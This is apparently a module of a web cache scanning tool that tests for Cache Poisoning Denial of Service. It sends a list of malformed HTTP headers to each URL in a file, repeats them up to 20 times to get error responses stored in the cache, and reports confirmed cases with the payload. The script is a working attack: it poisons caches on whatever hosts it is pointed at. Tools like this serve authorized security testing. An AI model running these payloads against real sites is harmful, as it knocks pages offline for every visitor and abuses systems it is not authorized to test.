#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Attempts to find Cache Poisoning Denial of Service (CpDoS) error based
https://cpdos.org/
"""

from ..utils import *

def check_cached(url, s, pk, main_status_code, authent):
    behavior = False
    confirmed = False
    cache_status = False

    try:
        for i in range(0, 20):
            req = s.get(url, headers=pk, verify=False, auth=authent, timeout=10)
        req_verify = s.get(url, verify=False, auth=authent, timeout=10)
        #print(f"{req.status_code} :: {req_verify.status_code}")
        if req.status_code == req_verify.status_code and req.status_code not in [429, 200, 304]:
            behavior = True
            for rh in req_verify.headers:
                if "age" in rh.lower() or "hit" in req_verify.headers[rh].lower():
                    confirmed = True
                    cache_status = True
        elif req.status_code != req_verify.status_code and req.status_code == 304:
            for rh in req_verify.headers:
                if "age" in rh.lower():
                    confirmed = True
                    cache_status = True
        elif req.status_code != req_verify.status_code and req.status_code not in [429, 304]:
            for rh in req_verify.headers:
                if "age" in rh.lower() or "hit" in req_verify.headers[rh].lower():
                    behavior = True
                    cache_status = True

        if confirmed:
            print(f"\033[31m └── VULNERABILITY CONFIRMED\033[0m | CPDoSError {main_status_code} > {req.status_code} | CACHE : {cache_status} | \033[34m{url}\033[0m | PAYLOAD: {pk}")
            behavior = False
        elif behavior:
            print(f"\033[33m └── INTERESTING BEHAVIOR\033[0m | CPDoSError {main_status_code} > {req.status_code} | CACHE : {cache_status} | \033[34m{url}\033[0m | PAYLOAD: {pk}")
    except Exception as e:
        pass
        #print(f"Error : {e}")


def get_error(url, s, main_status_code, authent):

    payload_keys = [
    {"xyz": "1"},
    {"(": "1"},
    {"x-timer": "x"*500},
    {"X-Timer": "5000"},
    {"X-Requested-With": "SomeValue"},
    {"Authorization": "Bearer InvalidToken"},
    {"Accept": "toto"},
    {"Accept-Encoding": "toto"},
    {"Accept-Encoding": "gzip;q=1.0, identity;q=0.5, *;q=0"},
    {"Expect": "100-continue"},
    #{"If-None-Match": "*"},
    {"If-None-Match": "*", 
    "If-Match": "toto"},
    {"If-None-Match": "<toto>"},
    {"Max-Forwards": "0"},
    {"Max-Forwards": "foo"},
    {"TE": "toto"},
    {"Connection": "toto"},
    {"Content-Encoding": "deflate"},
    {"Upgrade": "toto"},
    {"Proxy-Authorization": "Basic dXNlcjpwYXNzd29yZA=="},
    {"Via": "1.1 proxy.example.com"},
    {"DNT": "1"},
    {"Content-Disposition": "invalid_value"},
    {"Warning": "199 - Invalid Warning"},
    {"Trailer": "invalid_header"},
    {"Referer": "xy"},
    {"Referer": "xy", "Referer": "x"},
    {"Content-Length":"394616521189"},
    {"Content-Length": "-1"},
    {"Transfer-Encoding": "chunked"},
    {"Content-Type": "application/invalid-type"},
    {"Retry-After":"-1"},
    {"Retry-After":"foo"},
    {"Retry-After":"1200"},
    {"X-RateLimit-Limit": "1000"},
    {"X-RateLimit-Remaining": "500"},
    {"X-RateLimit-Reset": "1581382800"},
    {"X-Requested-With": "foo"},
    {"X-Content-Type-Options": "foo"},
    {"TE": "teapot"},
    {"TE": "foo"},
    {"X-CF-APP-INSTANCE": "xxx:1"},
    {"X-CF-APP-INSTANCE":"aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa:1"}
    ]
    for pk in payload_keys:
        try:
            req = s.get(url, headers=pk, verify=False, auth=authent, timeout=10)
            if req.status_code != 200 and main_status_code not in [403, 401] and req.status_code != main_status_code:
                #print(f"[{main_status_code}>{req.status_code}] [{len(main_status_code.headers)}b>{len(req.headers)}b] [{len(main_status_code.content)}b>{len(req.content)}b] {url} :: {pk}")
                check_cached(url, s, pk, main_status_code, authent)
        except requests.Timeout:
            #print(f"request timeout {url} {p}")
            pass
        except KeyboardInterrupt:
            print("Exiting")
            sys.exit()
        except Exception as e:
            #print(f"Error : {e}")
            pass


if __name__ == '__main__':
    url_file = sys.argv[1]
    s = requests.Session()
    #get_error(url_file, s)
    with open(url_file, "r") as urls:
        urls = urls.read().splitlines()
        for url in urls:
            url = f"{url}?cb={random.randrange(999)}"
            try:
                req_main = requests.get(url, verify=False, timeout=10)
                main_status_code = req_main.status_code
                authent = False
                get_error(url, s, main_status_code, authent)
            except KeyboardInterrupt:
                print("Exiting")
                sys.exit()
            except:
                pass
            print(f" {url}", end='\r')